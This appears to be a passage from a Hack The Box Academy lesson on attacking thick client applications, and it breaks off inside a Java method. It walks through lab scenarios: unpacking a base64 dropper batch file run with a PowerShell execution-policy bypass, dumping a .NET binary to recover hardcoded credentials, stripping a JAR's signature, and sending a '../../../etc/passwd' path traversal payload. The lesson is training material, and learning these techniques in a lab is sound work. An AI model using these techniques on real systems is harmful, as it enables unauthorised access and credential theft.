<td><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a></td>
<td><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/strings">Strings</a></td>
</tr>
</tbody>
</table>
<p><strong>Client Side attacks</strong></p>
<p>Although thick clients perform significant processing and data storage on the client side, they still communicate with servers for various tasks, such as data synchronization or accessing shared resources. This interaction with servers and other external systems can expose thick clients to vulnerabilities similar to those found in web applications, including command injection, weak access control, and SQL injection.</p>
<p>Sensitive information like usernames and passwords, tokens, or strings for communication with other services, might be stored in the application&#39;s local files. Hardcoded credentials and other sensitive information can also be found in the application&#39;s source code, thus Static Analysis is a necessary step while testing the application. Using the proper tools, we can reverse-engineer and examine .NET and Java applications including EXE, DLL, JAR, CLASS, WAR, and other file formats. Dynamic analysis should also be performed in this step, as thick client applications store sensitive information in the memory as well.</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.ghidra-sre.org/">Ghidra</a></td>
<td><a href="https://hex-rays.com/ida-pro/">IDA</a></td>
<td><a href="http://www.ollydbg.de/">OllyDbg</a></td>
<td><a href="https://www.radare.org/r/index.html">Radare2</a></td>
</tr>
<tr>
<td><a href="https://github.com/dnSpy/dnSpy">dnSpy</a></td>
<td><a href="https://x64dbg.com/">x64dbg</a></td>
<td><a href="https://github.com/skylot/jadx">JADX</a></td>
<td><a href="https://frida.re/">Frida</a></td>
</tr>
</tbody>
</table>
<p><strong>Network Side Attacks</strong></p>
<p>If the application is communicating with a local or remote server, network traffic analysis will help us capture sensitive information that might be transferred through HTTP/HTTPS or TCP/UDP connection, and give us a better understanding of how that application is working. Penetration testers that are performing traffic analysis on thick client applications should be familiar with tools like:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.wireshark.org/">Wireshark</a></td>
<td><a href="https://www.tcpdump.org/">tcpdump</a></td>
<td><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview">TCPView</a></td>
<td><a href="https://portswigger.net/burp">Burp Suite</a></td>
</tr>
</tbody>
</table>
<p><strong>Server Side Attacks</strong></p>
<p>Server-side attacks in thick client applications are similar to web application attacks, and penetration testers should pay attention to the most common ones including most of the OWASP Top Ten.</p>
<hr>
<h3 id="retrieving-hardcoded-credentials-from-thick-client-applications">Retrieving hardcoded Credentials from Thick-Client Applications</h3>
<p>The following scenario walks us through enumerating and exploiting a thick client application, in order to move laterally inside a corporative network during penetration testing. The scenario starts after we have gained access to an exposed SMB service.</p>
<p>Exploring the <code>NETLOGON</code> share of the SMB service reveals <code>RestartOracle-Service.exe</code> among other files. Downloading the executable locally and running it through the command line, it seems like it does not run or it runs something hidden.</p>
<p>Attacking Thick Client Applications</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\A</span>pps&gt;.<span class="hljs-symbol">\R</span>estart-OracleService.exe
C:<span class="hljs-symbol">\A</span>pps&gt;
</code></pre>
<p>Downloading the tool <code>ProcMon64</code> from <a href="https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon">SysInternals</a> and monitoring the process reveals that the executable indeed creates a temp file in <code>C:\Users\Matt\AppData\Local\Temp</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients/procmon.png" alt="procmon"></p>
<p>In order to capture the files, it is required to change the permissions of the <code>Temp</code> folder to disallow file deletions. To do this, we right-click the folder <code>C:\Users\Matt\AppData\Local\Temp</code> and under <code>Properties</code> -&gt; <code>Security</code> -&gt; <code>Advanced</code> -&gt; <code>cybervaca</code> -&gt; <code>Disable inheritance</code> -&gt; <code>Convert inherited permissions into explicit permissions on this object</code> -&gt; <code>Edit</code> -&gt; <code>Show advanced permissions</code>, we deselect the <code>Delete subfolders and files</code>, and <code>Delete</code> checkboxes.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients/change-perms.png" alt="change-perms"></p>
<p>Finally, we click <code>OK</code> -&gt; <code>Apply</code> -&gt; <code>OK</code> -&gt; <code>OK</code> on the open windows. Once the folder permissions have been applied we simply run again the <code>Restart-OracleService.exe</code> and check the <code>temp</code> folder. The file <code>6F39.bat</code> is created under the <code>C:\Users\cybervaca\AppData\Local\Temp\2</code>. The names of the generated files are random every time the service is running.</p>
<p>Attacking Thick Client Applications</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\A</span>pps&gt;dir C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\c</span>ybervaca<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\2</span>

...SNIP...
04/03/2023  02:09 PM         1,730,212 6F39.bat
04/03/2023  02:09 PM                 0 6F39.tmp
</code></pre>
<p>Listing the content of the <code>6F39</code> batch file reveals the following.</p>
<p>Code: batch</p>
<pre><code class="lang-batch">@shift /<span class="hljs-number">0</span>
@<span class="hljs-keyword">echo</span> off

<span class="hljs-keyword">if</span> %username% == matt <span class="hljs-keyword">goto</span> correcto
<span class="hljs-keyword">if</span> %username% == frankytech <span class="hljs-keyword">goto</span> correcto
<span class="hljs-keyword">if</span> %username% == ev4si0n <span class="hljs-keyword">goto</span> correcto
<span class="hljs-keyword">goto</span> error

:correcto
<span class="hljs-keyword">echo</span> TVqQAAMAAAAEAAAA<span class="hljs-comment">//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt; c:\programdata\oracle.txt</span>
<span class="hljs-keyword">echo</span> AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g &gt;&gt; c:\programdata\oracle.txt
&lt;SNIP&gt;
<span class="hljs-keyword">echo</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt;&gt; c:\programdata\oracle.txt

<span class="hljs-keyword">echo</span> $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; <span class="hljs-keyword">foreach</span> ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(<span class="hljs-string">" "</span>,<span class="hljs-string">""</span>); [System.IO.File]::WriteAllBytes(<span class="hljs-string">"c:\programdata\restart-service.exe"</span>, [System.Convert]::FromBase64String($salida)) &gt; c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
</code></pre>
<p>Inspecting the content of the file reveals that two files are being dropped by the batch file and being deleted before anyone can get access to the leftovers. We can try to retrieve the content of the 2 files, by modifying the batch script and removing the deletion.</p>
<p>Code: batch</p>
<pre><code class="lang-batch">@shift /<span class="hljs-number">0</span>
@<span class="hljs-keyword">echo</span> off

<span class="hljs-keyword">echo</span> TVqQAAMAAAAEAAAA<span class="hljs-comment">//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt; c:\programdata\oracle.txt</span>
<span class="hljs-keyword">echo</span> AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g &gt;&gt; c:\programdata\oracle.txt
&lt;SNIP&gt;
<span class="hljs-keyword">echo</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt;&gt; c:\programdata\oracle.txt

<span class="hljs-keyword">echo</span> $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; <span class="hljs-keyword">foreach</span> ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(<span class="hljs-string">" "</span>,<span class="hljs-string">""</span>); [System.IO.File]::WriteAllBytes(<span class="hljs-string">"c:\programdata\restart-service.exe"</span>, [System.Convert]::FromBase64String($salida)) &gt; c:\programdata\monta.ps1
</code></pre>
<p>After executing the batch script by double-clicking on it, we wait a few minutes to spot the <code>oracle.txt</code> file which contains another file full of base64 lines, and the script <code>monta.ps1</code> which contains the following content, under the directory <code>c:\programdata\</code>. Listing the content of the file <code>monta.ps1</code> reveals the following code.</p>
<p>Attacking Thick Client Applications</p>
<pre><code class="lang-powershell-session">C:\&gt;  <span class="hljs-keyword">cat</span> C:\programdata\monta.ps1

<span class="hljs-variable">$salida</span> = <span class="hljs-variable">$null</span>; <span class="hljs-variable">$fichero</span> = (Get-Content C:\ProgramData\oracle.txt) ; <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$linea</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$fichero</span>) {<span class="hljs-variable">$salida</span> += <span class="hljs-variable">$linea</span> }; <span class="hljs-variable">$salida</span> = <span class="hljs-variable">$salida</span>.<span class="hljs-keyword">Replace</span>(<span class="hljs-string">" "</span>,<span class="hljs-string">""</span>); [System.IO.<span class="hljs-keyword">File</span>]::WriteAllBytes(<span class="hljs-string">"c:\programdata\restart-service.exe"</span>, [System.Convert]::FromBase64String(<span class="hljs-variable">$salida</span>))
</code></pre>
<p>This script simply reads the contents of the <code>oracle.txt</code> file and decodes it to the <code>restart-service.exe</code> executable. Running this script gives us a final executable that we can further analyze.</p>
<p>Attacking Thick Client Applications</p>
<pre><code class="lang-powershell-session">C:\&gt;  ls C:\programdata\

Mode                LastWriteTime         Length Name
&lt;SNIP&gt;
-<span class="hljs-keyword">a</span><span class="hljs-comment">----        3/24/2023   1:01 PM            273 monta.ps1</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">----        3/24/2023   1:01 PM         601066 oracle.txt</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">----        3/24/2023   1:17 PM         432273 restart-service.exe</span>
</code></pre>
<p>Now when executing <code>restart-service.exe</code> we are presented with the banner <code>Restart Oracle</code> created by <code>HelpDesk</code> back in 2010.</p>
<p>Attacking Thick Client Applications</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">C:</span>\&gt;  .\restart-service.exe

    ____            __             __     ____                  __
   <span class="hljs-regexp">/ __ \___  _____/</span> <span class="hljs-regexp">/_____ ______/</span> <span class="hljs-regexp">/_   /</span> __ \_________ ______<span class="hljs-regexp">/ /</span>__
  <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/ /</span> _ \<span class="hljs-regexp">/ ___/</span> __<span class="hljs-regexp">/ __ `/</span> ___<span class="hljs-regexp">/ __/</span>  <span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/ /</span> ___<span class="hljs-regexp">/ __ `/</span> ___<span class="hljs-regexp">/ /</span> _ \
 <span class="hljs-regexp">/ _, _/</span>  __(__  ) <span class="hljs-regexp">/_/</span> <span class="hljs-regexp">/_/</span> <span class="hljs-regexp">/ /</span>  <span class="hljs-regexp">/ /</span>_   <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/  /</span> <span class="hljs-regexp">/_/</span> <span class="hljs-regexp">/ /</span>__<span class="hljs-regexp">/ /</span>  __/
<span class="hljs-regexp">/_/</span> |_|\___<span class="hljs-regexp">/____/\_</span>_<span class="hljs-regexp">/\__,_/</span>_<span class="hljs-regexp">/   \__/</span>   \____<span class="hljs-regexp">/_/</span>   \__,_<span class="hljs-regexp">/\___/</span>_<span class="hljs-regexp">/\___/</span>

                                                by <span class="hljs-meta">@HelpDesk</span> <span class="hljs-number">2010</span>


PS <span class="hljs-string">C:</span>\ProgramData&gt;
</code></pre>
<p>Inspecting the execution of the executable through <code>ProcMon64</code> shows that it is querying multiple things in the registry and does not show anything solid to go by.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients/proc-restart.png" alt="proc-restart"></p>
<p>Let&#39;s start <code>x64dbg</code>, navigate to <code>Options</code> -&gt; <code>Preferences</code>, and uncheck everything except <code>Exit Breakpoint</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/Exit\_Breakpoint\_1.png" alt="text"></p>
<p>By unchecking the other options, the debugging will start directly from the application&#39;s exit point, and we will avoid going through any <code>dll</code> files that are loaded before the app starts. Then, we can select <code>file</code> -&gt; <code>open</code> and select the <code>restart-service.exe</code> to import it and start the debugging. Once imported, we right click inside the <code>CPU</code> view and <code>Follow in Memory Map</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/Follow-In-Memory-Map.png" alt="gdb\_banner"></p>
<p>Checking the memory maps at this stage of the execution, of particular interest is the map with a size of <code>0000000000003000</code> with a type of <code>MAP</code> and protection set to <code>-RW--</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/Identify-Memory-Map.png" alt="maps"></p>
<p>Memory-mapped files allow applications to access large files without having to read or write the entire file into memory at once. Instead, the file is mapped to a region of memory that the application can read and write as if it were a regular buffer in memory. This could be a place to potentially look for hardcoded credentials.</p>
<p>If we double-click on it, we will see the magic bytes <code>MZ</code> in the <code>ASCII</code> column that indicates that the file is a <a href="https://en.wikipedia.org/wiki/DOS\_MZ\_executable">DOS MZ executable</a>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients/magic\_bytes\_3.png" alt="magic\_bytes\_3"></p>
<p>Let&#39;s export the newly discovered mapped item from memory to a dump file by right-clicking on the address and selecting <code>Dump Memory to File</code>. Running <code>strings</code> on the exported file reveals some interesting information.</p>
<p>Attacking Thick Client Applications</p>
<pre><code class="lang-powershell-session">C:<span class="hljs-symbol">\&gt;</span> C:<span class="hljs-symbol">\T</span>OOLS<span class="hljs-symbol">\S</span>trings<span class="hljs-symbol">\s</span>trings64.exe .<span class="hljs-symbol">\r</span>estart-service_00000000001E0000.bin

&lt;SNIP&gt;
"#M
z<span class="hljs-symbol">\V</span>
).NETFramework,Version=v4.0,Profile=Client
FrameworkDisplayName
.NET Framework 4 Client Profile
&lt;SNIP&gt;
</code></pre>
<p>Reading the output reveals that the dump contains a <code>.NET</code> executable. We can use <code>De4Dot</code> to reverse <code>.NET</code> executables back to the source code by dragging the <code>restart-service_00000000001E0000.bin</code> onto the <code>de4dot</code> executable.</p>
<p>Attacking Thick Client Applications</p>
<pre><code class="lang-cmd-session">de4dot v3.1.41592.3405

Detected Unknown Obfuscator (C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\c</span>ybervaca<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\r</span>estart-service_00000000001E0000.bin)
Cleaning C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\c</span>ybervaca<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\r</span>estart-service_00000000001E0000.bin
Renaming all obfuscated symbols
Saving C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\c</span>ybervaca<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\r</span>estart-service_00000000001E0000-cleaned.bin


Press any key to exit...
</code></pre>
<p>Now, we can read the source code of the exported application by dragging and dropping it onto the <code>DnSpy</code> executable.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients/souce-code\_hidden.png" alt="souce-code\_hidden"></p>
<p>With the source code disclosed, we can understand that this binary is a custom-made <code>runas.exe</code> with the sole purpose of restarting the Oracle service using hardcoded credentials.</p>
<h2 id="exploiting-web-vulnerabilities-in-thick-client-applications">Exploiting Web Vulnerabilities in Thick-Client Applications</h2>
<hr>
<p>Thick client applications with a three-tier architecture have a security advantage over those with a two-tier architecture since it prevents the end-user from communicating directly with the database server. However, three-tier applications can be susceptible to web-specific attacks like SQL Injection and Path Traversal.</p>
<p>During penetration testing, it is common for someone to encounter a thick client application that connects to a server to communicate with the database. The following scenario demonstrates a case where the tester has found the following files while enumerating an FTP server that provides <code>anonymous</code> user access.</p>
<ul>
<li>fatty-client.jar</li>
<li>note.txt</li>
<li>note2.txt</li>
<li>note3.txt</li>
</ul>
<p>Reading the content of all the text files reveals that:</p>
<ul>
<li>A server has been reconfigured to run on port <code>1337</code> instead of <code>8000</code>.</li>
<li>This might be a thick/thin client architecture where the client application still needs to be updated to use the new port.</li>
<li>The client application relies on <code>Java 8</code>.</li>
<li>The login credentials for login in the client application are <code>qtc / clarabibi</code>.</li>
</ul>
<p>Let&#39;s run the <code>fatty-client.jar</code> file by double-clicking on it. Once the app is started, we can log in using the credentials <code>qtc / clarabibi</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/err.png" alt="err"></p>
<p>This is not successful, and the message <code>Connection Error!</code> is displayed. This is probably because the port pointing to the servers needs to be updated from <code>8000</code> to <code>1337</code>. Let&#39;s capture and analyze the network traffic using Wireshark to confirm this. Once Wireshark is started, we click on <code>Login</code> once again.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/wireshark.png" alt="wireshark"></p>
<p>Below is showcased an example on how to approach DNS requests from applications in your favour. Verify the contents of the C:\Windows\System32\drivers\etc\hosts file where the IP 172.16.17.114 is pointed to fatty.htb and server.fatty.htb</p>
<p>The client attempts to connect to the <code>server.fatty.htb</code> subdomain. Let&#39;s start a command prompt as administrator and add the following entry to the <code>hosts</code> file.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\&gt;</span> echo 10.10.10.174    server.fatty.htb &gt;&gt; C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts
</code></pre>
<p>Inspecting the traffic again reveals that the client is attempting to connect to port <code>8000</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/port.png" alt="port"></p>
<p>The <code>fatty-client.jar</code> is a Java Archive file, and its content can be extracted by right-clicking on it and selecting <code>Extract files</code>.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session">C:\&gt; ls fatty-client\

&lt;SNIP&gt;
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       <span class="hljs-number">10</span><span class="hljs-regexp">/30/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">10</span> PM                htb
d-----       <span class="hljs-number">10</span><span class="hljs-regexp">/30/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">10</span> PM                META-INF
d-----        <span class="hljs-number">4</span><span class="hljs-regexp">/26/</span><span class="hljs-number">2017</span>  <span class="hljs-number">12</span>:<span class="hljs-number">09</span> AM                org
------       <span class="hljs-number">10</span><span class="hljs-regexp">/30/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">10</span> PM           <span class="hljs-number">1550</span> beans.xml
------       <span class="hljs-number">10</span><span class="hljs-regexp">/30/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">10</span> PM           <span class="hljs-number">2230</span> <span class="hljs-keyword">exit</span>.png
------       <span class="hljs-number">10</span><span class="hljs-regexp">/30/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">10</span> PM           <span class="hljs-number">4317</span> fatty.p12
------       <span class="hljs-number">10</span><span class="hljs-regexp">/30/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">10</span> PM            <span class="hljs-number">831</span> log4j.properties
------        <span class="hljs-number">4</span><span class="hljs-regexp">/26/</span><span class="hljs-number">2017</span>  <span class="hljs-number">12</span>:<span class="hljs-number">08</span> AM            <span class="hljs-number">299</span> module-info.class
------       <span class="hljs-number">10</span><span class="hljs-regexp">/30/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">10</span> PM          <span class="hljs-number">41645</span> spring-beans-<span class="hljs-number">3.0</span>.xsd
</code></pre>
<p>Let&#39;s run PowerShell as administrator, navigate to the extracted directory and use the <code>Select-String</code> command to search all the files for port <code>8000</code>.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session"><span class="hljs-keyword">C</span>:\&gt; ls fatty-client\ -recurse | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">String</span> <span class="hljs-string">"8000"</span> | <span class="hljs-keyword">Select</span> <span class="hljs-keyword">Path</span>, LineNumber | <span class="hljs-keyword">Format</span>-<span class="hljs-keyword">List</span>

<span class="hljs-keyword">Path</span>       : <span class="hljs-keyword">C</span>:\Users\cybervaca\Desktop\fatty-client\beans.xml
LineNumber : <span class="hljs-number">13</span>
</code></pre>
<p>There&#39;s a match in <code>beans.xml</code>. This is a <code>Spring</code> configuration file containing configuration metadata. Let&#39;s read its content.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session">C:\&gt; cat fatty-client\beans.xml

<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
<span class="hljs-comment">&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. --&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"connectionContext"</span> <span class="hljs-attr">class</span> = <span class="hljs-string">"htb.fatty.shared.connection.ConnectionContext"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">value</span> = <span class="hljs-string">"server.fatty.htb"</span>/&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">value</span> = <span class="hljs-string">"8000"</span>/&gt;</span>
   <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

<span class="hljs-comment">&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"trustedFatty"</span> <span class="hljs-attr">class</span> = <span class="hljs-string">"htb.fatty.shared.connection.TrustedFatty"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span> = <span class="hljs-string">"keystorePath"</span> <span class="hljs-attr">value</span> = <span class="hljs-string">"fatty.p12"</span>/&gt;</span>
   <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"secretHolder"</span> <span class="hljs-attr">class</span> = <span class="hljs-string">"htb.fatty.shared.connection.SecretHolder"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span> = <span class="hljs-string">"secret"</span> <span class="hljs-attr">value</span> = <span class="hljs-string">"clarabibiclarabibiclarabibi"</span>/&gt;</span>
   <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
</code></pre>
<p>Let&#39;s edit the line <code>&lt;constructor-arg index=&quot;1&quot; value = &quot;8000&quot;/&gt;</code> and set the port to <code>1337</code>. Reading the content carefully, we also notice that the value of the <code>secret</code> is <code>clarabibiclarabibiclarabibi</code>. Running the edited application will fail due to an <code>SHA-256</code> digest mismatch. The JAR is signed, validating every file&#39;s <code>SHA-256</code> hashes before running. These hashes are present in the file <code>META-INF/MANIFEST.MF</code>.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">C:</span>\&gt; cat fatty-client\META-INF\MANIFEST.MF

Manifest-<span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span>
Archiver-<span class="hljs-string">Version:</span> Plexus Archiver
Built-<span class="hljs-string">By:</span> root
<span class="hljs-string">Sealed:</span> True
Created-<span class="hljs-string">By:</span> Apache Maven <span class="hljs-number">3.3</span><span class="hljs-number">.9</span>
Build-<span class="hljs-string">Jdk:</span> <span class="hljs-number">1.8</span><span class="hljs-number">.0</span>_232
Main-<span class="hljs-string">Class:</span> htb.fatty.client.run.Starter
<span class="hljs-symbol">
Name:</span> META-INF<span class="hljs-regexp">/maven/</span>org.slf4j<span class="hljs-regexp">/slf4j-log4j12/</span>pom.properties
SHA<span class="hljs-number">-256</span>-<span class="hljs-string">Digest:</span> miPHJ+Y50c4aqIcmsko7Z<span class="hljs-regexp">/hdj03XNhHx3C/</span>pZbEp4Cw=
<span class="hljs-symbol">
Name:</span> org<span class="hljs-regexp">/springframework/</span>jmx<span class="hljs-regexp">/export/</span>metadata/ManagedOperationParamete
 r.<span class="hljs-keyword">class</span>
SHA<span class="hljs-number">-256</span>-<span class="hljs-string">Digest:</span> h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
&lt;SNIP&gt;
</code></pre>
<p>Let&#39;s remove the hashes from <code>META-INF/MANIFEST.MF</code> and delete the <code>1.RSA</code> and <code>1.SF</code> files from the <code>META-INF</code> directory. The modified <code>MANIFEST.MF</code> should end with a new line.</p>
<p>Code: txt</p>
<pre><code class="lang-txt"><span class="hljs-selector-tag">Manifest-Version</span>: 1<span class="hljs-selector-class">.0</span>
<span class="hljs-selector-tag">Archiver-Version</span>: <span class="hljs-selector-tag">Plexus</span> <span class="hljs-selector-tag">Archiver</span>
<span class="hljs-selector-tag">Built-By</span>: <span class="hljs-selector-tag">root</span>
<span class="hljs-selector-tag">Sealed</span>: <span class="hljs-selector-tag">True</span>
<span class="hljs-selector-tag">Created-By</span>: <span class="hljs-selector-tag">Apache</span> <span class="hljs-selector-tag">Maven</span> 3<span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.9</span>
<span class="hljs-selector-tag">Build-Jdk</span>: 1<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.0_232</span>
<span class="hljs-selector-tag">Main-Class</span>: <span class="hljs-selector-tag">htb</span><span class="hljs-selector-class">.fatty</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.run</span><span class="hljs-selector-class">.Starter</span>
</code></pre>
<p>We can update and run the <code>fatty-client.jar</code> file by issuing the following commands.</p>
<p>Exploiting Web Vulnerabilities in Thick-Client Applications</p>
<pre><code class="lang-powershell-session">C:<span class="hljs-symbol">\&gt;</span> cd .<span class="hljs-symbol">\f</span>atty-client
C:<span class="hljs-symbol">\&gt;</span> jar -cmf .<span class="hljs-symbol">\M</span>ETA-INF<span class="hljs-symbol">\M</span>ANIFEST.MF ..<span class="hljs-symbol">\f</span>atty-client-new.jar *
</code></pre>
<p>Then, we double-click on the <code>fatty-client-new.jar</code> file to start it and try logging in using the credentials <code>qtc / clarabibi</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/login.png" alt="login"></p>
<p>This time we get the message <code>Login Successful!</code>.</p>
<hr>
<h3 id="foothold">Foothold</h3>
<p>Clicking on <code>Profile</code> -&gt; <code>Whoami</code> reveals that the user <code>qtc</code> is assigned with the <code>user</code> role.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/profile1.png" alt="profile1"></p>
<p>Clicking on the <code>ServerStatus,</code> we notice that we can&#39;t click on any options.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/status.png" alt="status"></p>
<p>This implies that there might be another user with higher privileges that is allowed to use this feature. Clicking on the <code>FileBrowser</code> -&gt; <code>Notes.txt</code> reveals the file <code>security.txt</code>. Clicking the <code>Open</code> option at the bottom of the window shows the following content.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/security.png" alt="security"></p>
<p>This note informs us that a few critical issues in the application still need to be fixed. Navigating to the <code>FileBrowser</code> -&gt; <code>Mail</code> option reveals the <code>dave.txt</code> file containing interesting information. We can read its content by clicking the <code>Open</code> option at the bottom of the window.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/dave.png" alt="dave"></p>
<p>The message from dave says that all <code>admin</code> users are removed from the database. It also refers to a timeout implemented in the login procedure to mitigate time-based SQL injection attacks.</p>
<hr>
<h3 id="path-traversal">Path Traversal</h3>
<p>Since we can read files, let&#39;s attempt a path traversal attack by giving the following payload in the field and clicking the <code>Open</code> button.</p>
<p>Code: txt</p>
<pre><code class="lang-txt">../../../../../../etc/passwd
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/passwd.png" alt="passwd"></p>
<p>The server filters out the <code>/</code> character from the input. Let&#39;s decompile the application using <a href="http://java-decompiler.github.io/">JD-GUI</a>, by dragging and dropping the <code>fatty-client-new.jar</code> onto the <code>jd-gui</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/jdgui.png" alt="jdgui"></p>
<p>Save the source code by pressing the <code>Save All Sources</code> option in <code>jdgui</code>. Decompress the <code>fatty-client-new.jar.src.zip</code> by right-clicking and selecting <code>Extract files</code>. The file <code>fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java</code> handles the application features. Reading its content reveals the following code.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {

      }).getClass().getEnclosingMethod().getName();
    logger.logInfo(<span class="hljs-string">"[+] Method '"</span> + methodName + <span class="hljs-string">"' was called by user '"</span> + <span class="hljs-keyword">this</span>.user.getUsername() + <span class="hljs-string">"'."</span>);
